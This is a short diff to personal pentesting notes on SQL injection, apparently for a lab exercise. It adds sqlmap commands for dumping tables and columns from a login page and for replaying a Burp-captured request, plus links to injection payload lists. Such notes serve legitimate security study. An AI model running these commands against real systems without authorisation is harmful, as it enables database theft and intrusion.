@@ -40,7 +40,10 @@ Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypa
 6. table_name
 7. column_name
 # until the error occurs
-sqlmap --url http://tbfc.net/login.php --tables --columns <br/>
+- sqlmap --url http://tbfc.net/login.php --tables --columns <br/>
+<br/> intercept in burp, save item , save request then:
+- sqlmap -r {request} --batch (replace {request} with your file name).
+
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 - https://github.com/payloadbox/sql-injection-payload-list
 - https://www.codecademy.com/articles/sql-commands
